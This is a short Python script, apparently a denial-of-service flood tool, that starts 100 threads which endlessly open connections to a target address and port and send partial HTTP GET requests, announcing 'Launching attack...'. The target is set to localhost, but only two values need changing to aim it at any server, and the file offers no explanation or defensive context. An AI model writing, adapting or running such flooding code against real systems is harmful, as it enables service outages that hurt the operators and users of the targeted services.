import socket
import threading
import time

def attack(target_ip, target_port):
    while True:
        try:
            s = socket.socket()
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
        except:
            pass

if __name__ == "__main__":
    target_ip = '127.0.0.1'
    target_port = 8080

    print("Launching attack...")
    for _ in range(100):  # Simulate 100 threads
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()
